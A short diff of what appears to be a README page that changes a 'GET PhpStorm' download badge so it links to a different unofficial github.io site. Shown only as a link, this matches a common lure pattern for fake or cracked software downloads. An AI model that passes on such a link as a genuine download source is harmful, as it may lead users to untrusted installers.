@@ -7,7 +7,7 @@
 <br>   
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/phpstorm">  
+<a href="https://install-quick-software.github.io/.github/phpstorm">  
 <img src="https://img.shields.io/badge/💡_GET_PhpStorm-indigo?style=for-the-badge&logo=apple" alt="GET PhpStorm">  
 </a>  
 </div>  
